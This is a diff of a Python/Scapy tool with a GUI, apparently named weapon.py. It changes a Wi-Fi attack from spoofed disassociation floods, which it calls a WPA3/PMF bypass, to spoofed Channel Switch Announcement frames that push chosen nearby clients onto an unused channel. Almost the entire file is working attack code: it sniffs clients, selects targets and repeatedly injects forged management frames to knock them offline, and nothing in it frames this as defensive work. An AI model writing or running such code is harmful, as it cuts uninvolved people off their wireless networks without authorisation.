@@ -2,32 +2,33 @@ import os, sys, time, threading
 from scapy.all import *
 import tkinter as tk
 
-class WiFiWeaponV4_5:
+class SurgicalWeaponV5:
     def __init__(self, iface):
         self.iface = iface
         self.clients = {}  
-        self.persistent_targets = set()
-        self.calibrated_timeouts = {} 
+        self.active_attacks = set()
         
         self.prepare_hardware()
         
         self.root = tk.Tk()
-        self.root.title("Surgical Restore v4.5")
-        self.root.geometry("700x520")
-        self.root.configure(bg="#0a0a0a")
+        self.root.title("CSA Steering Logic v5.0 (WPA3/PMF)")
+        self.root.geometry("700x550")
+        self.root.configure(bg="#050505")
 
-        self.listbox = tk.Listbox(self.root, selectmode='multiple', bg="#111", fg="#00FF41", font=("Courier", 10), height=15)
-        self.listbox.pack(padx=10, pady=10, fill="x")
+        # --- GUI Elements ---
+        self.listbox = tk.Listbox(self.root, selectmode='multiple', bg="#111", fg="#00FF41", font=("Courier", 10), height=18)
+        self.listbox.pack(padx=10, pady=10, fill="both", expand=True)
 
-        # Logic Buttons
-        btn_frame = tk.Frame(self.root, bg="#0a0a0a")
-        btn_frame.pack()
+        btn_frame = tk.Frame(self.root, bg="#050505")
+        btn_frame.pack(pady=10)
         
-        tk.Button(btn_frame, text="ATTACK SELECTED", command=self.toggle_persistent, bg="#AA0000", fg="white", width=20).pack(side="left", padx=5)
-        tk.Button(btn_frame, text="RESTORE ALL", command=self.restore_internet, bg="#0055ff", fg="white", width=20).pack(side="left", padx=5)
+        tk.Button(btn_frame, text="STEER (KICK)", command=self.start_steer, bg="#AA0000", fg="white", width=15).pack(side="left", padx=5)
+        tk.Button(btn_frame, text="RESTORE (PULL)", command=self.restore_client, bg="#0055FF", fg="white", width=15).pack(side="left", padx=5)
+        
+        self.status_label = tk.Label(self.root, text="Ready for Injection...", bg="#050505", fg="#555")
+        self.status_label.pack()
 
         threading.Thread(target=self.discovery_engine, daemon=True).start()
-        threading.Thread(target=self.attack_engine, daemon=True).start()
 
     def prepare_hardware(self):
         os.system(f"sudo airmon-ng check kill")
@@ -37,66 +38,58 @@ class WiFiWeaponV4_5:
 
     def discovery_engine(self):
         def handler(pkt):
-            if pkt.haslayer(Dot11):
-                dot11 = pkt.getlayer(Dot11)
-                # Map clients to APs
-                if dot11.type == 2:
-                    c, b = dot11.addr2, dot11.addr3
-                    if b and c and c != b and c != "ff:ff:ff:ff:ff:ff":
-                        if c not in self.clients:
-                            self.clients[c] = {"BSSID": b, "last_query": 0}
-                            self.root.after(0, self.refresh_ui)
-                
-                # Logic: Catch the SA Query for calibration
-                if dot11.type == 0 and dot11.subtype == 13 and raw(pkt.payload).startswith(b'\x08'):
-                    if dot11.addr1 in self.clients:
-                        self.clients[dot11.addr1]["last_query"] = time.time()
-
+            if pkt.haslayer(Dot11) and pkt.type == 2:
+                c, b = pkt.addr2, pkt.addr3
+                if b and c and c != b and c != "ff:ff:ff:ff:ff:ff":
+                    if c not in self.clients:
+                        # Logic: Identify current channel automatically
+                        channel = int(ord(pkt[RadioTap].notdecoded[0:1])) if pkt.haslayer(RadioTap) else 1
+                        self.clients[c] = {"BSSID": b, "Channel": channel}
+                        self.root.after(0, self.refresh_ui)
         sniff(iface=self.iface, prn=handler, store=0)
 
-    def attack_engine(self):
-        while True:
-            for client_mac in list(self.persistent_targets):
-                data = self.clients.get(client_mac)
-                if not data: continue
-                
-                b = data["BSSID"]
-                # Logic: WPA3/PMF bypass attempt using Reason 30
-                # Reason 30 = "Disassociated due to lack of SA Query response"
-                p = RadioTap()/Dot11(addr1=client_mac, addr2=b, addr3=b)/Dot11Disas(reason=30)
-                sendp(p, count=20, inter=0.01, verbose=False)
-                
-            time.sleep(0.5)
+    def create_csa_frame(self, client_mac, bssid, channel):
+        # Logic: Category 0 (Spectrum Management), Action 4 (Channel Switch)
+        # Element ID 37 (Channel Switch Announcement)
+        # Mode: 1 (Stop transmitting), New Channel, Count: 0 (Immediate)
+        dot11 = Dot11(addr1=client_mac, addr2=bssid, addr3=bssid)
+        # Constructing the CSA Information Element manually for maximum compatibility
+        csa_payload = b"\x00\x04\x25\x03\x01" + bytes([channel]) + b"\x00"
+        return RadioTap()/dot11/Dot11Action()/csa_payload
 
-    def restore_internet(self):
-        # Logic: Send 'Invite' frames to all targets to force quick reconnection
-        print("[*] Restoring connections...")
-        targets = list(self.persistent_targets)
-        self.persistent_targets.clear() # Stop the attack loop
-        
-        for client_mac in targets:
-            data = self.clients.get(client_mac)
-            if data:
-                b = data["BSSID"]
-                # Send Authentication frame to tell client the AP is ready
-                restore_pkt = RadioTap()/Dot11(addr1=client_mac, addr2=b, addr3=b)/Dot11Auth(algo=0, seqnum=1, status=0)
-                sendp(restore_pkt, count=10, verbose=False)
-        
+    def start_steer(self):
+        for i in self.listbox.curselection():
+            mac = list(self.clients.keys())[i]
+            data = self.clients[mac]
+            # Send to a non-existent channel (Logic: 165 is usually unused)
+            pkt = self.create_csa_frame(mac, data["BSSID"], 165)
+            self.active_attacks.add(mac)
+            
+            def attack_loop():
+                while mac in self.active_attacks:
+                    sendp(pkt, iface=self.iface, verbose=False, count=5)
+                    time.sleep(1)
+            
+            threading.Thread(target=attack_loop, daemon=True).start()
+        self.refresh_ui()
+
+    def restore_client(self):
+        for i in self.listbox.curselection():
+            mac = list(self.clients.keys())[i]
+            if mac in self.active_attacks:
+                self.active_attacks.remove(mac)
+                data = self.clients[mac]
+                # Logic: Steer them back to their original channel
+                restore_pkt = self.create_csa_frame(mac, data["BSSID"], data["Channel"])
+                sendp(restore_pkt, count=20, iface=self.iface, verbose=False)
         self.refresh_ui()
 
     def refresh_ui(self):
         self.listbox.delete(0, tk.END)
         for mac, info in self.clients.items():
-            status = "!! BLOCKED !!" if mac in self.persistent_targets else "[STABLE]"
-            self.listbox.insert(tk.END, f"{status} Client: {mac} | AP: {info['BSSID']}")
-
-    def toggle_persistent(self):
-        for i in self.listbox.curselection():
-            mac = list(self.clients.keys())[i]
-            if mac in self.persistent_targets: self.persistent_targets.remove(mac)
-            else: self.persistent_targets.add(mac)
-        self.refresh_ui()
+            status = " [STEERING...] " if mac in self.active_attacks else " [CONNECTED] "
+            self.listbox.insert(tk.END, f"{status} {mac} | AP: {info['BSSID']} | CH: {info['Channel']}")
 
 if __name__ == "__main__":
     if len(sys.argv) < 2: print("Usage: sudo python3 weapon.py [interface]")
-    else: WiFiWeaponV4_5(sys.argv[1]).root.mainloop()
+    else: SurgicalWeaponV5(sys.argv[1]).root.mainloop()
